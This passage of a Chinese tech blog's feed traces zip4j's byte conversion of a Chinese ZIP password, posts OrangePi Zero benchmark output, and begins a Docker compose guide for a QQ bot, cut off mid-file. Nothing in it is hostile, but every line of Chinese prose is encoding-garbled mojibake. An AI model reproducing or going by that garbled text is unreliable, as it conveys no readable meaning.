ä¾¿ä¹˜å˜æˆä»€ä¹ˆæ ·äº†ï¼Ÿ" class="headerlink" title="å¯†ç ä¾¿ä¹˜å˜æˆä»€ä¹ˆæ ·äº†ï¼Ÿ"></a>å¯†ç <del>ä¾¿ä¹˜</del>å˜æˆä»€ä¹ˆæ ·äº†ï¼Ÿ</h3><p>æˆ‘ä»¬ç›´æ¥ç¿»é˜…zip4jçš„æºä»£ç ï¼š  </p><figure class="highlight java"><figcaption><span>src&#x2F;main&#x2F;java&#x2F;net&#x2F;lingala&#x2F;zip4j&#x2F;ZipFile.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUseUtf8CharsetForPasswords</span><span class="params">(<span class="type">boolean</span> useUtf8CharsetForPasswords)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.useUtf8CharsetForPasswords = useUtf8CharsetForPasswords;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿï¼š  </p><figure class="highlight java"><figcaption><span>src&#x2F;main&#x2F;java&#x2F;net&#x2F;lingala&#x2F;zip4j&#x2F;crypto&#x2F;StandardDecrypter.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">byte</span>[] headerBytes, <span class="type">char</span>[] password, <span class="type">long</span> lastModifiedFileTime, <span class="type">long</span> crc,</span></span><br><span class="line"><span class="params">                    <span class="type">boolean</span> useUtf8ForPassword)</span> <span class="keyword">throws</span> ZipException &#123;</span><br><span class="line">    <span class="keyword">if</span> (password == <span class="literal">null</span> || password.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ZipException</span>(<span class="string">&quot;Wrong password!&quot;</span>, ZipException.Type.WRONG_PASSWORD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zipCryptoEngine.initKeys(password, useUtf8ForPassword);</span><br></pre></td></tr></table></figure><p>ç»§ç»­ï¼š  </p><figure class="highlight java"><figcaption><span>src&#x2F;main&#x2F;java&#x2F;net&#x2F;lingala&#x2F;zip4j&#x2F;crypto&#x2F;engine&#x2F;ZipCryptoEngine.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initKeys</span><span class="params">(<span class="type">char</span>[] password, <span class="type">boolean</span> useUtf8ForPassword)</span> &#123;</span><br><span class="line">  keys[<span class="number">0</span>] = <span class="number">305419896</span>;</span><br><span class="line">  keys[<span class="number">1</span>] = <span class="number">591751049</span>;</span><br><span class="line">  keys[<span class="number">2</span>] = <span class="number">878082192</span>;</span><br><span class="line">  <span class="type">byte</span>[] bytes = convertCharArrayToByteArray(password, useUtf8ForPassword);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">    updateKeys((<span class="type">byte</span>) (b &amp; <span class="number">0xff</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥äº†ï¼š  </p><figure class="highlight java"><figcaption><span>src&#x2F;main&#x2F;java&#x2F;net&#x2F;lingala&#x2F;zip4j&#x2F;util&#x2F;Zip4jUtil.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convertCharArrayToByteArray(<span class="type">char</span>[] charArray, <span class="type">boolean</span> useUtf8Charset) &#123;</span><br><span class="line">  <span class="keyword">return</span> useUtf8Charset</span><br><span class="line">          ? convertCharArrayToByteArrayUsingUtf8(charArray)</span><br><span class="line">          : convertCharArrayToByteArrayUsingDefaultCharset(charArray);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convertCharArrayToByteArrayUsingDefaultCharset(<span class="type">char</span>[] charArray) &#123;</span><br><span class="line">  <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[charArray.length];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; charArray.length; i++) &#123;</span><br><span class="line">    bytes[i] = (<span class="type">byte</span>) charArray[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠè¿™æ®µä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åå†æ‰¾ä¸€æ®µå°†è¾“å‡ºè½¬ä¸ºHEXçš„ä»£ç ï¼Œç»„åˆèµ·æ¥è¯•ç€è¿è¡Œçœ‹çœ‹ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnZip</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;å…‹æ‹‰æ‹‰&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(password.toCharArray());</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] encbytes = <span class="keyword">new</span> <span class="title class_">byte</span>[password.toCharArray().length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; password.toCharArray().length; i++) &#123;</span><br><span class="line">encbytes[i] = (<span class="type">byte</span>) password.toCharArray()[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(bytesToHex(encbytes));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span>[] HEX_ARRAY = <span class="string">&quot;0123456789ABCDEF&quot;</span>.toCharArray();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] hexChars = <span class="keyword">new</span> <span class="title class_">char</span>[bytes.length * <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bytes.length; j++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> bytes[j] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        hexChars[j * <span class="number">2</span>] = HEX_ARRAY[v &gt;&gt;&gt; <span class="number">4</span>];</span><br><span class="line">        hexChars[j * <span class="number">2</span> + <span class="number">1</span>] = HEX_ARRAY[v &amp; <span class="number">0x0F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(hexChars);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å…‹æ‹‰æ‹‰</span><br><span class="line">4BC9C9</span><br></pre></td></tr></table></figure><p>å¥½ï¼Œé‚£ä¹ˆè¿™ä¸ª<code>4B C9 C9</code>æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Ÿ<br>æˆ‘ä»¬æ‰“å¼€winhexï¼Œç›´æ¥æ‰“è¿›å»çœ‹çœ‹ï¼š<br><img src="/pictures/chinese-zip-password/8.png"><br>å¥½ï¼Œå¤åˆ¶ç²˜è´´åˆ°WinRARï¼š<br><img src="/pictures/chinese-zip-password/9.png"><br><img src="/pictures/chinese-zip-password/10.png">  </p><p>å¥½ï¼Œå®Œå·¥ï¼Œåˆæ˜¯æ¶¨å¥‡æ€ªçŸ¥è¯†çš„ä¸€å¤©ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;èµ·å› &quot;&gt;&lt;a href=&quot;#èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;èµ·å› &quot;&gt;&lt;/a&gt;èµ·å› &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æŸå¤©ï¼Œæˆ‘çš„æœ‹å‹åœ¨QQä¸Šè½¬å‘ç»™æˆ‘äº†ä¸€ä¸ªå¸¦å¯†ç çš„Zipå‹ç¼©åŒ…&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/pictures/chinese-zip-password/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘çœ‹äº†ä¸€çœ¼ï¼ŒåŒå‡»åé»˜è®¤ç”¨WinRARæ‰“å¼€äº†ï¼Œç„¶åå¤åˆ¶ç²˜è´´å¯†ç ï¼š&lt;br&gt;&lt;img src=&quot;/pictures/chinese-zip-password/2.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;å•Šï¼Ÿå¯†ç é”™è¯¯ï¼Ÿ&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/categories/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>OrangePi Zero CPUè·‘åˆ†æµ‹è¯• CPU Benchmark</title>
    <link href="https://thinkalone.win/OrangePiZero-CPU-Benchmark.html"/>
    <id>https://thinkalone.win/OrangePiZero-CPU-Benchmark.html</id>
    <published>2023-12-01T04:00:00.000Z</published>
    <updated>2025-03-01T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>CPU:H2+<br>RAM:512M  </p><p>(äº2025&#x2F;03é‡æµ‹)  </p><p>screenfetch  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">       _,met$$$$$gg.           disappear9@OPi-Zero</span><br><span class="line">    ,g$$$$$$$$$$$$$$$P.        OS: Debian 12 bookworm</span><br><span class="line">  ,g$$P&quot;&quot;       &quot;&quot;&quot;Y$$.&quot;.      Kernel: armv7l Linux 6.6.75-current-sunxi</span><br><span class="line"> ,$$P&#x27;              `$$$.      Uptime: 1h 41m</span><br><span class="line">&#x27;,$$P       ,ggs.     `$$b:    Packages: 437</span><br><span class="line">`d$$&#x27;     ,$P&quot;&#x27;   .    $$$     Shell: bash</span><br><span class="line"> $$P      d$&#x27;     ,    $$P     Disk: 3.8G / 30G (14%)</span><br><span class="line"> $$:      $$.   -    ,d$$&#x27;     CPU: ARMv7 rev 5 (v7l) @ 4x 1.296GHz</span><br><span class="line"> $$\;      Y$b._   _,d$P&#x27;      GPU:</span><br><span class="line"> Y$$.    `.`&quot;Y$$$$P&quot;&#x27;          RAM: -</span><br><span class="line"> `$$b      &quot;-.__</span><br><span class="line">  `Y$$</span><br><span class="line">   `Y$$.</span><br><span class="line">     `$$b.</span><br><span class="line">       `Y$$b.</span><br><span class="line">          `&quot;Y$b._</span><br><span class="line">              `&quot;&quot;&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>7-zip 16.02:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">disappear9@OPi-Zero:~$ 7z b -mmt4</span><br><span class="line"></span><br><span class="line">7-Zip [32] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,32 bits,4 CPUs LE)</span><br><span class="line"></span><br><span class="line">LE</span><br><span class="line">CPU Freq: 32000000 - - - - - - - -</span><br><span class="line"></span><br><span class="line">RAM size:     489 MB,  # CPU hardware threads:   4</span><br><span class="line">RAM usage:    450 MB,  # Benchmark threads:      4</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:       1513   347    424   1472  |      44851   396    966   3827</span><br><span class="line">23:       1431   356    410   1459  |      41115   396    899   3557</span><br><span class="line">24:       1305   355    396   1403  |      37626   396    834   3303</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:             353    410   1445  |              396    900   3562</span><br><span class="line">Tot:             374    655   2504</span><br><span class="line">disappear9@OPi-Zero:~$ 7z b -mmt1</span><br><span class="line"></span><br><span class="line">7-Zip [32] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,32 bits,4 CPUs LE)</span><br><span class="line"></span><br><span class="line">LE</span><br><span class="line">CPU Freq: 64000000 64000000 64000000 - - - - - -</span><br><span class="line"></span><br><span class="line">RAM size:     489 MB,  # CPU hardware threads:   4</span><br><span class="line">RAM usage:    435 MB,  # Benchmark threads:      1</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:        573   100    558    558  |      11927   100   1019   1018</span><br><span class="line">23:        539   100    550    550  |      11765   100   1019   1018</span><br><span class="line">24:        518   100    557    557  |      11506   100   1010   1010</span><br><span class="line">25:        491   100    562    561  |      11200   100    997    997</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:             100    557    557  |              100   1011   1011</span><br><span class="line">Tot:             100    784    784</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sysbench  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">disappear9@OPi-Zero:~$ sysbench cpu --cpu-max-prime=20000 --threads=4 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 4</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:    74.41</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0407s</span><br><span class="line">    total number of events:              748</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                   53.14</span><br><span class="line">         avg:                                   53.62</span><br><span class="line">         max:                                  107.58</span><br><span class="line">         95th percentile:                       52.89</span><br><span class="line">         sum:                                40104.21</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           187.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   10.0261/0.01</span><br><span class="line"></span><br><span class="line">disappear9@OPi-Zero:~$ sysbench cpu --cpu-max-prime=20000 --threads=1 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 1</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:    18.59</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0466s</span><br><span class="line">    total number of events:              187</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                   53.17</span><br><span class="line">         avg:                                   53.71</span><br><span class="line">         max:                                  106.98</span><br><span class="line">         95th percentile:                       52.89</span><br><span class="line">         sum:                                10044.25</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           187.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   10.0442/0.00</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CPU:H2+&lt;br&gt;RAM:512M  &lt;/p&gt;
&lt;p&gt;(äº2025&amp;#x2F;03é‡æµ‹)  &lt;/p&gt;
&lt;p&gt;screenfetch  &lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;       _,met$$$$$gg.           disappear9@OPi-Zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ,g$$$$$$$$$$$$$$$P.        OS: Debian 12 bookworm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ,g$$P&amp;quot;&amp;quot;       &amp;quot;&amp;quot;&amp;quot;Y$$.&amp;quot;.      Kernel: armv7l Linux 6.6.75-current-sunxi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ,$$P&amp;#x27;              `$$$.      Uptime: 1h 41m&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x27;,$$P       ,ggs.     `$$b:    Packages: 437&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;`d$$&amp;#x27;     ,$P&amp;quot;&amp;#x27;   .    $$$     Shell: bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$P      d$&amp;#x27;     ,    $$P     Disk: 3.8G / 30G (14%)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$:      $$.   -    ,d$$&amp;#x27;     CPU: ARMv7 rev 5 (v7l) @ 4x 1.296GHz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$&#92;;      Y$b._   _,d$P&amp;#x27;      GPU:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; Y$$.    `.`&amp;quot;Y$$$$P&amp;quot;&amp;#x27;          RAM: -&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; `$$b      &amp;quot;-.__&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `Y$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   `Y$$.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     `$$b.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       `Y$$b.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          `&amp;quot;Y$b._&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              `&amp;quot;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/categories/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
    
    <category term="æ‚é¡¹" scheme="https://thinkalone.win/tags/%E6%9D%82%E9%A1%B9/"/>
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/tags/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ Docker éƒ¨ç½² zhenxun_botï¼ˆç»ªå±±çœŸå¯»Botï¼‰</title>
    <link href="https://thinkalone.win/zx_bot_Docker.html"/>
    <id>https://thinkalone.win/zx_bot_Docker.html</id>
    <published>2023-01-10T04:00:00.000Z</published>
    <updated>2023-01-10T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æŒ‡è·¯"><a href="#æŒ‡è·¯" class="headerlink" title="æŒ‡è·¯"></a>æŒ‡è·¯</h1><p><a href="https://github.com/D9Lab/zhenxun_bot_docker"><img src="https://shields.io/badge/GITHUB-D9Lab/zhenxun_bot_docker-4476AF?logo=github&style=for-the-badge" alt="Github"></a></p><p><a href="https://github.com/HibiKier/zhenxun_bot"><img src="https://shields.io/badge/GITHUB-HibiKier/zhenxun_bot-4476AF?logo=github&style=for-the-badge" alt="Github"></a></p><h1 id="ä½¿ç”¨Portainerå»ºç«‹Stacks"><a href="#ä½¿ç”¨Portainerå»ºç«‹Stacks" class="headerlink" title="ä½¿ç”¨Portainerå»ºç«‹Stacks"></a>ä½¿ç”¨Portainerå»ºç«‹Stacks</h1><p>æ‰“å¼€Stacksï¼ŒAdd stack ç²˜è´´ä»¥ä¸‹ä»£ç   </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">go-cqhttp:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">silicer/go-cqhttp:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zxbot_go-cqhttp</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go-cqhttp_data:/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bot_data:/bot</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bot:bot</span>  <span class="comment">#é…ç½®ä¸ºws reverseï¼Œåœ°å€ ws://bot:8080/onebot/v11/ws</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:14</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zxbot_postgres</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_USER=zxbot</span></span><br><span class="line">      <span class="bullet">-</span> <span 